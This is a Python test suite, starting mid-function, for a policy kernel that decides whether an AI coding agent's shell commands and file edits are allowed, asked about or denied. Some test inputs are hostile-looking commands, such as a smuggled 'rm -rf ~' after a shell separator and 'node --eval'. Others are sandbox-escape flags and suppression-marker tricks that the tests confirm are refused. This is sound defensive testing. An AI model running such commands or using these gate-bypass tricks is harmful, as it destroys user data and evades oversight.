    assert effect(f"node {helper} && rm source.py") == "ask"
    assert effect("node /tmp/openai-docs/scripts/fetch-codex-manual.mjs") == "deny"
    assert effect(f"node {root}/../escape.mjs") == "deny"
    assert effect("node --eval 'process.exit()'") == "deny"
    assert (
        ShellPolicy(SHELL_RULES, trusted_script_roots=["/"])
        .decide(ShellCommand(command="node /tmp/untrusted-script.mjs"))
        .effect
        == "deny"
    )


def test_shell_policy_preserves_golden_compound_and_wrapper_outcomes(
    tmp_path: Path,
) -> None:
    bundled = load_bundled_kernel(tmp_path, "shell")
    policy = ShellPolicy(
        SHELL_RULES,
        path_roles=FIXTURE_PATH_ROLES,
        path_rules=FIXTURE_PATH_RULES,
        runner_targets=FIXTURE_RUNNER_TARGETS,
    )
    hosts: dict[HostShape, ShellPolicy] = {}

    def host_policy(case: DecisionCase) -> ShellPolicy:
        """One policy per host shape a case describes, built once for each."""
        shape = HostShape(
            sandboxed=case.sandboxed,
            escapable=case.escapable,
            interactive=case.interactive,
        )
        if shape not in hosts:
            hosts[shape] = ShellPolicy(
                SHELL_RULES,
                sandbox_active=case.sandboxed,
                sandbox_excluded_commands=FIXTURE_EXCLUDED_COMMANDS,
                escapable=case.escapable,
                interactive=case.interactive,
                path_roles=FIXTURE_PATH_ROLES,
                path_rules=FIXTURE_PATH_RULES,
                runner_targets=FIXTURE_RUNNER_TARGETS,
            )
        return hosts[shape]

    for index, case in enumerate(SHELL_POLICY_CASES):
        active = host_policy(case)
        # Each case judges a tree of its own, so a file one case declares
        # present never leaks into the next case's create-versus-overwrite.
        root = tmp_path / f"case{index}"
        root.mkdir()
        for name in case.existing:
            present = root / name
            present.parent.mkdir(parents=True, exist_ok=True)
            present.write_text("already here", encoding="utf-8")
        for name in case.empty:
            (root / name).mkdir(parents=True, exist_ok=True)
        decided = active.decide(ShellCommand(command=case.input, cwd=root))
        assert decided.effect == case.effect, case.input
        bundled_effect = bundled.decide_shell(
            case.input,
            policy.rules,
            sandboxed=case.sandboxed,
            excluded_commands=FIXTURE_EXCLUDED_COMMANDS,
            escapable=case.escapable,
            interactive=case.interactive,
            path_roles=FIXTURE_PATH_ROLES,
            path_rules=policy.path_rules,
            existing_targets=case.host_existing(),
            empty_directories=case.empty,
            runner_targets=policy.runner_targets,
        ).effect
        assert bundled_effect == case.effect, case.input


def test_write_targets_name_only_the_paths_a_command_opens_for_writing() -> None:
    assert shell_write_targets("echo x > out.txt") == ["out.txt"]
    assert shell_write_targets("echo x >> notes.log") == ["notes.log"]
    assert shell_write_targets("cat > a.py <<'EOF'\nbody\nEOF") == ["a.py"]
    assert shell_write_targets("wc -l < input.txt") == []
    assert shell_write_targets("grep x f 2>&1") == []
    assert shell_write_targets("ls >&2") == []
    assert shell_write_targets("a > one.txt | b > two.txt") == ["one.txt", "two.txt"]
    assert shell_write_targets("frobnicate --weird") == []


def test_whether_a_file_was_already_there_no_longer_decides_a_redirection(
    tmp_path: Path,
) -> None:
    """The axis that separated these is spent, and the path is what is left.

    Creating allowed and overwriting asked, because overwriting replaced
    content nothing had read. Content is now read after the command runs,
    against the file it wrote -- which is the only moment it *can* be read,
    since a redirection's content is produced by running -- so the question
    the existence test was standing in for is answered elsewhere, and both
    forms land on what was always knowable in advance: where the write goes.
    """
    policy = ShellPolicy(SHELL_RULES)
    existing = tmp_path / "kept.txt"
    existing.write_text("prior work", encoding="utf-8")
    command = "echo x > kept.txt"

    assert policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect == "allow"
    existing.unlink()
    assert policy.decide(ShellCommand(command=command, cwd=tmp_path)).effect == "allow"


def test_sandbox_escape_reenters_the_lattice_the_boundary_was_answering() -> None:
    """Leaving the boundary puts the operation back where nothing carries it.

    Confined, Lup settles what nobody classified to a permission held
    inside — a permission rather than a handoff, so the placement is Lup's
    and holds however permissive the session's own mode is. Escaped, that
    fact is gone, and the floor for a command the vocabulary merely does
    not list is the reviewer rather than a refusal. A command the kernel
    could not *read* still lands on the refusal, which the second half pins.
    """
    policy = ShellPolicy(SHELL_RULES, sandbox_active=True)
    confined = policy.decide(ShellCommand(command="frobnicate --weird"))
    assert (confined.effect, confined.sandbox) == ("allow", "inside")
    escaped = policy.decide(
        ShellCommand(command="frobnicate --weird", unsandboxed=True)
    )
    assert escaped.effect == "ask"

    unreadable = policy.decide(
        ShellCommand(command="cat x ;& rm -rf ~", unsandboxed=True)
    )
    assert unreadable.effect == "deny"
    assert "escalate" in unreadable.reason


def test_an_operation_the_profile_cannot_place_is_refused_by_capability() -> None:
    """A placement no channel carries is a missing capability, not a verdict.

    Run inside instead, the operation would die on whatever it touched
    first — a bare read-only-filesystem error an agent reads as a broken
    repository rather than as a boundary, so it retries, works around it,
    or reports success from a session that never ran a command. Refused,
    it costs one turn and names the channel the profile does not have,
    which is what nobody could approve into existence.
    """
    command = ShellCommand(command="hostonly --run")
    rules = [
        ShellCommandRule(
            name="hostonly",
            effects=[declare("reads_path", scope="project")],
            sandbox="outside",
        )
    ]

    placed = ShellPolicy(rules, sandbox_active=True, escapable=True).decide(command)
    assert (placed.effect, placed.sandbox) == ("allow", "outside")

    trapped = ShellPolicy(rules, sandbox_active=True).decide(command)
    assert trapped.effect == "deny"
    assert trapped.reason == SANDBOX_TRAPPED_REASON
    assert trapped.cause == "capability"
    assert trapped.capability == "host_executor"


def test_a_help_probe_keeps_the_placement_its_target_declares() -> None:
    """Printing usage is a verdict about the effect and not about the place.

    Asking a target for its own usage is the same program under the same
    declaration, so it keeps that declaration's placement. Answered above
    the walk the probe returned a bare allow and the placement went with
    it: one target was placed by its own row while the same target's help
    probe, one word apart, fell to ``ambient`` — as did every other help
    probe in the vocabulary, whatever its depth. So the probe replaces the
    effect and the walk still answers for the placement.
    """
    targets = [
        RunnerTargetRule(
            name="placed-tool",
            sandbox="inside",
            effects=[declare("runs_declared_target")],
        )
    ]

    placed = ShellPolicy(
        SHELL_RULES,
        sandbox_active=True,
        escapable=True,
        runner_targets=targets,
    ).decide(ShellCommand(command="uv run placed-tool --help"))

    assert placed.effect == "allow"
    assert placed.sandbox == "inside"


def test_a_help_probe_of_an_unclassified_command_still_reads() -> None:
    """The probe's own reason for existing, which the placement must not cost.

    An unclassified command is refused, and being able to read its usage is
    how an agent finds the form that is not. Taking the placement from the
    walk leaves that untouched: nothing declares this command, so the walk
    declares no placement either.
    """
    read = ShellPolicy(SHELL_RULES, runner_targets=FIXTURE_RUNNER_TARGETS).decide(
        ShellCommand(command="frobnicate --help")
    )

    assert read.effect == "allow"
    assert read.sandbox == "ambient"


def test_non_interactive_denials_do_not_prescribe_escalation() -> None:
    """Codex hooks cannot complete the approval flow, so they never name it."""
    interactive = ShellPolicy(SHELL_RULES).decide(
        ShellCommand(command="git push --delete origin feat")
    )
    assert interactive.effect == "ask"

    blocked = ShellPolicy(SHELL_RULES, interactive=False).decide(
        ShellCommand(command="git push --delete origin feat")
    )
    assert blocked.effect == "deny"
    assert "escalate" not in blocked.reason
    assert "allowed vocabulary" in blocked.reason


def test_a_reviewed_worker_is_told_the_route_it_actually_has() -> None:
    """Non-interactive and alone are different states that shared one answer.

    A worker holds a question mailbox reaching the human supervising its
    run, so a guarded verb parks a durable question there rather than being
    refused — measured in #202, a refusal that named no route sent it to
    queue a *material question* instead, parking the whole run on a decision
    nobody needed to make. A genuinely headless run has no such channel, so
    the same verb is refused and told to reshape, because naming a route
    that is not there is the same failure pointed the other way.
    """
    guarded = ShellCommand(command="git push --delete origin feat")
    relayed = ShellPolicy(SHELL_RULES, interactive=False, relayed=True).decide(guarded)
    alone = ShellPolicy(SHELL_RULES, interactive=False).decide(guarded)

    assert relayed.effect == "ask"
    assert alone.effect == "deny"
    assert "reshape the command" in alone.reason
    assert (
        "request_allowance"
        in ShellPolicy(SHELL_RULES, interactive=False, relayed=True)
        .decide(ShellCommand(command="cat x ;& rm -rf ~"))
        .reason
    )


def test_claude_decoder_marks_unsandboxed_escapes() -> None:
    payload = ClaudeHookPayload(
        tool_name="Bash",
        tool_input={"command": "ls", "dangerouslyDisableSandbox": True},
    )
    decoded = ClaudeEventDecoder().decode(parse_claude_before_tool(payload))
    assert isinstance(decoded.tool, ShellCommand)
    assert decoded.tool.unsandboxed


def test_edit_policy_checks_every_file_before_allowing_batch() -> None:
    policy = EditPolicy(
        protected=[
            PathRule(
                kind="exact",
                value="pyproject.toml",
                reason="project configuration is protected",
            )
        ]
    )
    batch = EditBatch(
        changes=[
            EditChange(path=Path("safe.py"), before="x = 1", after="x = 2"),
            EditChange(
                path=Path("unsafe.py"),
                before="value: str",
                after="value: Any",
            ),
        ]
    )

    denied = policy.decide(batch)
    assert denied.effect == "deny"
    assert "(rule any-type — see docs/rules.md)" in denied.reason
    protected = EditBatch(
        changes=[EditChange(path=Path("pyproject.toml"), after="version = '2'")]
    )
    assert policy.decide(protected).effect == "ask"


def test_retiring_a_stale_suppression_needs_no_approval() -> None:
    """Removing an `ignore` whose violation is gone is ordinary tidying."""
    policy = EditPolicy(protected=[])
    retired = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="value: Any  # lup: ignore[any-type]",
                after="value: str",
            )
        ]
    )
    assert policy.decide(retired).effect == "allow"


def test_removing_a_live_suppression_is_caught_by_the_anti_pattern_gate() -> None:
    """No marker gate is needed: the violation it covered resurfaces first."""
    policy = EditPolicy(protected=[])
    exposed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="value: Any  # lup: ignore[any-type]",
                after="value: Any",
            )
        ]
    )
    decision = policy.decide(exposed)
    assert decision.effect == "deny"
    assert "any-type" in decision.reason


def test_declaring_a_suppression_still_asks() -> None:
    """Silencing a rule is a decision a human makes, not a small safe edit."""
    policy = EditPolicy(protected=[])
    declared = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="value: str",
                after="value: Any  # lup: ignore[any-type]",
            )
        ]
    )
    decision = policy.decide(declared)
    assert decision.effect == "ask"
    assert decision.reason.startswith("edit introduces an antipattern suppression")


def test_a_suppression_that_silences_nothing_is_refused() -> None:
    """A marker that suppresses nothing is the cheap way past a gate.

    The gate asks about every added directive alike, so a directive naming a
    rule the line does not trip costs one approval and buys an exemption
    nobody weighed. Asking would spend a human turn admitting a marker the
    audit reports spurious the moment it lands.
    """
    policy = EditPolicy(protected=[])
    dead = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\n",
                after="x = 1\ny = 2  # lup: ignore[dict-get]\n",
            )
        ]
    )
    decision = policy.decide(dead)

    assert decision.effect == "deny"
    assert "dict-get" in decision.reason


def test_an_uncovered_violation_denies_whatever_else_the_edit_declares() -> None:
    """One suppression must not carry the violations beside it through.

    Deciding the declared ask first left the denial below it unreachable for
    any edit that added a directive at all, so a marker covering line 2 bought
    approval for an unsuppressed line 3 the prompt never mentioned. The
    precedence is the strong rule's, applied to the rest of the table.

    The fourth case is what keeps this narrow: an edit whose every added
    violation is covered is the ordinary suppression path, and it still asks.
    """
    policy = EditPolicy(protected=[])

    def decide(after: str) -> Decision:
        return policy.decide(
            EditBatch(
                changes=[EditChange(path=Path("a.py"), before="x = 1\n", after=after)]
            )
        )

    alone = decide("x = 1\nsecond: Any = 3\n")
    genuine = decide(
        "x = 1\nfirst: Any = 2  # lup: ignore[any-type]\nsecond: Any = 3\n"
    )
    bare = decide("x = 1\ny = 2  # lup: ignore\nsecond: Any = 3\n")
    every_one_covered = decide(
        "x = 1\nfirst: Any = 2  # lup: ignore[any-type]\n"
        "second: Any = 3  # lup: ignore[any-type]\n"
    )

    assert alone.effect == "deny"
    assert genuine.effect == "deny"
    assert bare.effect == "deny"
    # The denial names what the ask was hiding, or it trades a silent approval
    # for a silent refusal.
    assert "line 3" in genuine.reason
    assert "any-type" in genuine.reason
    assert every_one_covered.effect == "ask"


def test_the_gate_refuses_the_marker_the_tree_already_settles() -> None:
    """Both gates reach one verdict, because one matcher answers both.

    A route decorator is not payload access, and the `dict-get` matcher says
    so from the tree alone, so a marker written there guards nothing. The
    audit reports that afterwards; the selector it reads is the kernel's own,
    so the same verdict is available at the point of writing, which is where
    it is worth having.
    """
    policy = EditPolicy(protected=[])
    refuted = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="def read() -> None:\n    pass\n",
                after=(
                    '@app.get("/x")  # lup: ignore[dict-get]\n'
                    "def read() -> None:\n    pass\n"
                ),
            )
        ]
    )
    decision = policy.decide(refuted)

    assert decision.effect == "deny"
    assert "dict-get" in decision.reason


def test_a_refusal_names_what_the_line_trips_instead() -> None:
    """The directive the site wanted is named, so the next attempt is not a guess."""
    policy = EditPolicy(protected=[])
    misnamed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\n",
                after="x = 1\nvalue: Any = 2  # lup: ignore[dict-get]\n",
            )
        ]
    )
    decision = policy.decide(misnamed)

    assert decision.effect == "deny"
    assert "names dict-get" in decision.reason
    assert "the line trips any-type instead" in decision.reason


def test_a_directive_written_above_its_violation_is_not_dead() -> None:
    """The overflow placement guards the line below, which an edit need not add.

    The reported failure this answers is a marker that went spurious while the
    violation it was written for stayed live. Judging a directive by its own
    line alone would refuse exactly the placement a reason too long to sit
    inline has to take.
    """
    policy = EditPolicy(protected=[])
    hoisted = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\nvalue: Any = 2\n",
                after=(
                    "x = 1\n"
                    "# lup: ignore[any-type] — the SDK hands back Any\n"
                    "value: Any = 2\n"
                ),
            )
        ]
    )
    assert policy.decide(hoisted).effect == "ask"


def test_shrinking_a_dead_directive_is_still_the_audit_s_own_fix() -> None:
    """The gate refusing a marker must not refuse the edit that removes it.

    Dropping one id from a directive is what the audit demands when it reports
    that id spurious, and the result is smaller whether or not what remains is
    dead too — refusing it would leave the marker unremovable.
    """
    policy = EditPolicy(protected=[])
    narrowed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\ny = 2  # lup: ignore[any-type, dict-get]\n",
                after="x = 1\ny = 2  # lup: ignore[any-type]\n",
            )
        ]
    )
    assert policy.decide(narrowed).effect == "allow"


def test_only_the_dead_half_of_a_directive_is_refused() -> None:
    """A directive doing part of its job is refused for the part that is dead.

    The remedy names the id rather than the directive, because dropping the
    whole of one that also covers a live violation would only resurface the
    denial it was silencing.
    """
    policy = EditPolicy(protected=[])
    mixed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\n",
                after="x = 1\nvalue: Any = 2  # lup: ignore[any-type, dict-get]\n",
            )
        ]
    )
    decision = policy.decide(mixed)

    assert decision.effect == "deny"
    assert "names dict-get" in decision.reason
    assert "Drop dict-get from it" in decision.reason


def test_a_rule_another_scanner_owns_is_not_refused_over() -> None:
    """A verdict this gate cannot reach is not one it may refuse over.

    `abc-capability` belongs to a scanner the hermetic runtime does not
    carry, so whether the line trips it is unknowable here — the same line
    the audit draws when it decides which markers it may call spurious.
    """
    policy = EditPolicy(protected=[])
    foreign = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\n",
                after="x = 1\nclass Store(ABC):  # lup: ignore[abc-capability]\n",
            )
        ]
    )
    assert policy.decide(foreign).effect == "ask"


def test_a_fragment_with_no_tree_is_not_refused_over_a_guess() -> None:
    """A matcher reads an AST, and a verdict from a missing one is a guess.

    `tuple-shape` is strong, so no directive may answer it and a denial from
    the pattern alone would be one with no escape. Where the fragment will
    not parse the rule fires nowhere, so what is left is the ordinary ask
    about the directive itself.
    """
    policy = EditPolicy(protected=[])
    fragment = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="    pass\n",
                after="    pair: tuple[int, str] = (1, 2)  # lup: ignore[tuple-shape]\n",
            )
        ]
    )
    assert policy.decide(fragment).effect == "ask"


def test_an_allowance_buys_a_live_suppression_and_never_a_dead_one() -> None:
    """The grant answers the ask, and the refusal is not an ask.

    A human approving a plan that needs suppressions approved reasoned
    exceptions, not markers that silence nothing — so the allowance reaches
    the directive that covers a violation and stops at the one that covers
    none.
    """

    def granted(after: str) -> KernelDecision:
        change = EditChange(path=Path("a.py"), before="value: str\n", after=after)
        return decide_edit(
            "a.py",
            change.before,
            change.after,
            path_exists=True,
            path_rules=[],
            antipattern_rows=antipattern_rows(change),
            allowances=["antipattern-suppression"],
            python_source=True,
        )

    assert granted("value: Any  # lup: ignore[any-type]\n").effect == "allow"
    assert granted("value: str  # lup: ignore[any-type]\n").effect == "deny"


def test_a_creation_names_the_suppressions_it_arrives_carrying() -> None:
    """A whole write is approved for its shape, and its directives ride along.

    Reviewing a creation is worth doing for the layout and the shape it shows,
    which is exactly what makes a directive in the middle of a new module the
    easiest thing in an edit to approve without having seen it.
    """
    policy = EditPolicy(protected=[])
    carrying = EditBatch(
        changes=[
            EditChange(
                path=Path("src/new.py"),
                after='"""Doc."""\n\nvalue: Any = 1  # lup: ignore[any-type]\n',
            )
        ]
    )
    plain = EditBatch(
        changes=[EditChange(path=Path("src/new.py"), after='"""Doc."""\n')]
    )
    decision = policy.decide(carrying)

    assert decision.effect == "ask"
    assert "this new file arrives carrying antipattern suppressions" in decision.reason
    assert (
        "line 3 silences any-type: value: Any = 1  # lup: ignore[any-type]"
        in decision.reason
    )
    assert policy.decide(plain).reason == "full-file writes require approval"


def test_dropping_one_rule_from_a_suppression_needs_no_approval() -> None:
    """Shrinking a directive is what the audit asks for when it calls one spurious.

    Reading the added line alone cannot tell this from a suppression appearing
    out of nowhere, so the gate used to ask — and the audit was already
    demanding the very edit it asked to approve.
    """
    policy = EditPolicy(protected=[])
    narrowed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="# lup: ignore[any-type, dict-get]\nvalue = 1\n",
                after="# lup: ignore[any-type]\nvalue = 1\n",
            )
        ]
    )
    assert policy.decide(narrowed).effect == "allow"


def test_a_bare_suppression_narrowed_to_named_rules_needs_no_approval() -> None:
    """The bare directive covers every rule, so naming a few can only shrink it."""
    policy = EditPolicy(protected=[])
    typed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="# lup: ignore\nvalue = 1\n",
                after="# lup: ignore[any-type]\nvalue = 1\n",
            )
        ]
    )
    assert policy.decide(typed).effect == "allow"


def test_widening_a_suppression_still_asks() -> None:
    """Adding a rule to a directive silences something it did not before."""
    policy = EditPolicy(protected=[])
    widened = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="# lup: ignore[any-type]\nvalue = 1\n",
                after="# lup: ignore[any-type, dict-get]\nvalue = 1\n",
            )
        ]
    )
    assert policy.decide(widened).effect == "ask"


def test_a_named_suppression_going_bare_still_asks() -> None:
    """Dropping the names widens the directive to every rule."""
    policy = EditPolicy(protected=[])
    widened = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="# lup: ignore[any-type]\nvalue = 1\n",
                after="# lup: ignore\nvalue = 1\n",
            )
        ]
    )
    assert policy.decide(widened).effect == "ask"


def test_prose_mentioning_a_suppression_is_not_declaring_one() -> None:
    """Documenting the escape hatch is neither a note nor a directive."""
    policy = EditPolicy(protected=[])
    documented = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before='NOTE_RE = compile(r"lup")',
                after=(
                    "# Matching `# lup: ignore` here is prose, not a directive.\n"
                    'NOTE_RE = compile(r"lup")'
                ),
            )
        ]
    )
    assert policy.decide(documented).effect == "allow"


def test_a_granted_suppression_releases_only_its_own_gate() -> None:
    """An allowance answers the gate it names, never the rest of the lattice."""
    change = EditChange(
        path=Path("a.py"),
        before="x = 1  # lup: fix",
        after="value: Any  # lup: ignore[any-type]",
    )
    decision = decide_edit(
        "a.py",
        change.before,
        change.after,
        path_exists=False,
        path_rules=[],
        antipattern_rows=antipattern_rows(change),
        allowances=["antipattern-suppression"],
        python_source=True,
    )
    assert decision.effect == "deny"
    assert "removes inline review feedback" in decision.reason


def test_adding_feedback_asks_and_deleting_it_is_refused() -> None:
    """The two directions are different acts and get different answers.

    An ask is something an agent argues through in the turn that wanted the
    deletion, and a deleted note is the one thing nobody can review after the
    fact: its absence is indistinguishable from a note that never existed.
    """
    policy = EditPolicy(protected=[])
    added = EditBatch(
        changes=[
            EditChange(path=Path("a.py"), before="x = 1", after="x = 1  # lup: fix")
        ]
    )
    removed = EditBatch(
        changes=[
            EditChange(path=Path("a.py"), before="x = 1  # lup: fix", after="x = 1")
        ]
    )

    assert policy.decide(added).effect == "ask"
    assert policy.decide(removed).effect == "deny"


def test_converting_a_note_into_a_claim_is_the_way_through() -> None:
    """Resolving keeps the words and changes the keyword, so it stays checkable."""
    policy = EditPolicy(protected=[])
    claimed = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1  # lup: fix the cache",
                after="x = 1  # lup: solved: fix the cache",
            )
        ]
    )

    assert policy.decide(claimed).effect == "allow"


def test_removing_a_customization_marker_is_not_removing_feedback() -> None:
    """A `template:` marker is answered by writing code, not by claiming.

    It behaves like `ignore` rather than like feedback: nobody is owed an
    answer to a placeholder, and the domain's own code standing where the
    scaffold's example stood leaves no original ask for a claim to be checked
    against. Denying its removal would refuse `/lup:init` the one edit it
    exists to make, in every repository built from this template.
    """
    policy = EditPolicy(protected=[])
    customized = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="# lup: template: pick your model tier\nTIER = None",
                after='TIER = "strongest"',
            )
        ]
    )

    assert policy.decide(customized).effect == "allow"


def test_no_allowance_retires_a_claim_through_the_edit_gate() -> None:
    """A claim is checked by someone other than whoever made it.

    The verify pass's authority lives in its own instrument
    (`dev comments --retire/--restore`), never in a session environment —
    so a grant claiming otherwise changes nothing here.
    """
    change = EditChange(
        path=Path("a.py"),
        before="x = 1  # lup: solved: fix the cache",
        after="x = 1",
    )
    batch = EditBatch(changes=[change])

    assert EditPolicy(protected=[]).decide(batch).effect == "deny"
    assert (
        decide_edit(
            "a.py",
            change.before,
            change.after,
            path_exists=True,
            path_rules=[],
            antipattern_rows=antipattern_rows(change),
            allowances=["note-resolution"],
            python_source=True,
        ).effect
        == "deny"
    )


def test_prose_documenting_the_marker_syntax_is_not_feedback() -> None:
    """A backtick span is an example, which is how a reader tells them apart.

    Counting quoted markers made documenting the convention indistinguishable
    from leaving a note, so writing about the gate tripped it.
    """
    policy = EditPolicy(protected=[])
    documented = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before='"""Doc."""\n',
                after='"""Resolve a note by writing `# lup: solved:` before it."""\n',
            )
        ]
    )

    assert policy.decide(documented).effect == "allow"


def test_a_note_in_scratch_is_not_gated() -> None:
    """Nothing under a scratch root persists to be read, so no reader is owed."""
    policy = EditPolicy(protected=[], path_roles=FIXTURE_PATH_ROLES)
    batch = EditBatch(
        changes=[
            EditChange(
                path=Path("tmp/probe.py"), before="x = 1  # lup: fix", after="x = 1"
            )
        ]
    )
    assert policy.decide(batch).effect == "allow"


def test_a_note_in_a_test_is_still_gated() -> None:
    """A test file persists and is read, so feedback left there is owed too."""
    policy = EditPolicy(protected=[], path_roles=FIXTURE_PATH_ROLES)
    batch = EditBatch(
        changes=[
            EditChange(
                path=Path("tests/unit/test_thing.py"),
                before="x = 1  # lup: fix",
                after="x = 1",
            )
        ]
    )
    assert policy.decide(batch).effect == "deny"


def test_retiring_a_suppression_the_ast_refutes_is_allowed() -> None:
    """The gate that demanded this marker gone must not be the one refusing it.

    A route decorator trips the `dict-get` regex and nothing else, so while
    the rule was only a regex the audit called the marker spurious and the
    kernel denied every edit that removed it — a change one gate required and
    the other forbade, with no operation in between.
    """
    policy = EditPolicy(protected=[])
    batch = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before='@app.get("/x")  # lup: ignore[dict-get]\ndef read() -> None:\n    pass\n',
                after='@app.get("/x")\ndef read() -> None:\n    pass\n',
            )
        ]
    )
    assert policy.decide(batch).effect == "allow"


def test_a_suppression_ask_names_every_line_it_is_asking_about() -> None:
    """A prompt carries the reason and nothing else, so it locates and names.

    The quoted line is a preview and a directive is written at the end of the
    line it guards, so which rule is being silenced is the first thing a cut
    takes — it is stated rather than left to be read back out.
    """
    policy = EditPolicy(protected=[])
    batch = EditBatch(
        changes=[
            EditChange(
                path=Path("a.py"),
                before="x = 1\n",
                after=(
                    "x = 1\n"
                    "first: Any = 1  # lup: ignore[any-type]\n"
                    "second: Any = 2  # lup: ignore[any-type]\n"
                ),
            )
        ]
    )
    decision = policy.decide(batch)

    assert decision.effect == "ask"
    assert (
        "line 2 silences any-type: first: Any = 1  # lup: ignore[any-type]"
        in decision.reason
    )
    assert (
        "line 3 silences any-type: second: Any = 2  # lup: ignore[any-type]"
        in decision.reason
    )


def test_a_denial_names_the_line_that_tripped_it() -> None:
    policy = EditPolicy(protected=[])
    batch = EditBatch(
        changes=[
            EditChange(path=Path("a.py"), before="x = 1\n", after="x = 1\ny: Any = 2\n")
        ]
    )
    decision = policy.decide(batch)

    assert decision.effect == "deny"
    assert decision.reason.startswith("line 2: ")


def test_a_composed_session_enforces_the_rules_the_generated_tree_does() -> None:
    """One declaration, two enforcement paths, and nothing between them.

    A generated dispatcher compiles the hook set into rows; a session this
    program composes builds policy objects from the same hook set. Neither
    can see the other, so a rule added to one and not the other would make a
    run's permissions depend on who launched it — which is exactly how a
    resolver worker ran under a directory ACL while every plugin generated
    from the same declaration judged the acts semantically.
    """
    hooks = next(plugin.hooks for plugin in portable_harness().plugins if plugin.hooks)
    composed = [path_rule_row(rule) for rule in declared_path_rules(hooks)]
    generated = runtime_path_rules(
        [root.as_posix() for root in hooks.protected_edit_roots],
        [path.as_posix() for path in hooks.human_owned_files],
    )

    assert composed == generated


def test_canonical_edit_policy_preserves_shared_security_outcomes() -> None:
    protected = [
        PathRule(
            kind="subtree",
            value=".claude",
            reason="protected path requires approval",
            allow_autonomous=True,
        ),
        human_owned_path_rule("README.md"),
        PathRule(
            kind="subtree",
            value="sync.json",
            reason="protected path requires approval",
            allow_autonomous=True,
        ),
        PathRule(
            kind="subtree",
            value="sync.json.local",
            reason="protected path requires approval",
            allow_autonomous=True,
        ),
    ]

    for case in EDIT_POLICY_CASES:
        policy = EditPolicy(
            protected=protected,
            autonomous=case.autonomous,
            path_roles=FIXTURE_PATH_ROLES,
        )
        decision = policy.decide(
            EditBatch(
                changes=[
                    EditChange(
                        path=Path(case.path), before=case.before, after=case.after
                    )
                ]
            )
        )
        assert decision.effect == case.effect


def test_bundled_edit_policy_matches_canonical_security_outcomes(
    tmp_path: Path,
) -> None:
    bundled = load_bundled_kernel(tmp_path, "edit")
    policy = EditPolicy(
        protected=[
            PathRule(
                kind="subtree",
                value=".claude",
                reason="protected path requires approval",
                allow_autonomous=True,
            ),
            human_owned_path_rule("README.md"),
            PathRule(
                kind="subtree",
                value="sync.json",
                reason="protected path requires approval",
                allow_autonomous=True,
            ),
            PathRule(
                kind="subtree",
                value="sync.json.local",
                reason="protected path requires approval",
                allow_autonomous=True,
            ),
        ],
        path_roles=FIXTURE_PATH_ROLES,
    )
    cases = [
        item
        for item in EDIT_POLICY_CASES
        if not item.autonomous and item.before is not None and item.after is not None
    ]
    for case in cases:
        canonical = policy.decide(
            EditBatch(
                changes=[
                    EditChange(
                        path=Path(case.path), before=case.before, after=case.after
                    )
                ]
            )
        )
        generated = assembled_edit_decision(
            bundled,
            case.path,
            case.before,
            case.after,
            [".claude", "pyproject.toml", "sync.json", "sync.json.local"],
            ["README.md"],
        )
        assert canonical.effect == generated.effect == case.effect


def test_bundled_autonomous_worker_keeps_guardrails(tmp_path: Path) -> None:
    bundled = load_bundled_kernel(tmp_path, "edit")

    cases = [item for item in EDIT_POLICY_CASES if item.autonomous]
    for case in cases:
        decision = assembled_edit_decision(
            bundled,
            case.path,
            case.before,
            case.after,
            [".claude"],
            ["README.md"],
            autonomous=True,
        )
        assert decision.effect == case.effect


def test_edit_policy_uses_full_python_context_for_added_docstrings(
    tmp_path: Path,
) -> None:
    bundled = load_bundled_kernel(tmp_path, "edit")
    before = '"""Documentation.\n"""\nvalue = 1'
    unrestricted_type_name = "A" + "ny"
    after = (
        f'"""Documentation can mention {unrestricted_type_name} safely.\n"""\nvalue = 1'
    )
    canonical = EditPolicy(protected=[]).decide(
        EditBatch(
            changes=[EditChange(path=Path("src/module.py"), before=before, after=after)]
        )
    )

    assert canonical.effect == "allow"
    assert (
        assembled_edit_decision(bundled, "src/module.py", before, after, [], []).effect
        == "allow"
    )


def test_edit_policy_bundle_embeds_canonical_ast_refinement(tmp_path: Path) -> None:
    bundled = load_bundled_kernel(tmp_path, "edit")
    before = (
        "class Scheduler:\n    def __init__(self) -> None:\n        self.ready = True\n"
    )
    empty_list_literal = "[]"
    after = before + f"        self.pending: list[str] = {empty_list_literal}\n"
    canonical = EditPolicy(protected=[]).decide(
        EditBatch(
            changes=[
                EditChange(path=Path("src/scheduler.py"), before=before, after=after)
            ]
        )
    )

    assert canonical.effect == "allow"
    assert (
        assembled_edit_decision(
            bundled, "src/scheduler.py", before, after, [], []
        ).effect
        == "allow"
    )


def test_content_prose_examples_do_not_trip_code_or_marker_gates() -> None:
    path = Path("packages/lup/src/lup/devtools/harness/content/skills/commit.py")
    before = path.read_text(encoding="utf-8")
    after = before + (
        '\nPROSE_GATE_EXAMPLE = """Any and # lup: examples remain prose."""\n'
    )

    decision = EditPolicy(protected=[]).decide(
        EditBatch(changes=[EditChange(path=path, before=before, after=after)])
    )

    assert decision.effect == "allow"


def granting(root: Path, *allowances: ConcernAllowance) -> LeaseGrants:
    """A lease holding exactly these gates, through the document that says so."""
    document = root / "grants.json"
    write_allowance_grants(document, list(allowances))
    return LeaseGrants(document)


def test_a_granted_new_devtools_allowance_releases_exactly_that_gate(
    tmp_path: Path,
) -> None:
